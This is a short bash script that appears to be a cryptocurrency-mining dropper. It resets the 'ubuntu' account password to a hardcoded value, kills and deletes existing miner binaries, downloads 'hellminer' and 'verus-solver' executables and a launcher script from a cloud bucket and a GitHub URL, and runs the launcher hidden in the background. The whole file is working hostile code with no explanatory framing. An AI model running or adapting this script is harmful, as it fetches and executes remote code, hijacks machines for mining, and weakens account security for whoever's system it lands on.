#!/bin/bash

echo "ubuntu:Inipassword@123" | chpasswd
declare -a lst=("run_miner.sh" "hellminer" "verus-solver")
dir=$(pwd)

for i in "${lst[@]}"
do
    killall "$i"
    rm -rf "$dir/$i"
    wget "https://akuadit.oss-ap-southeast-1.aliyuncs.com/hellminer/$i"
    chmod u+x "$dir/$i"
done

rm -rf run_miner.sh
wget "https://raw.githubusercontent.com/SankuNetwork/blankrepo/main/hellminer/run_miner.sh"
chmod u+x run_miner.sh
(exec bash "$dir/run_miner.sh" &> /dev/null &)
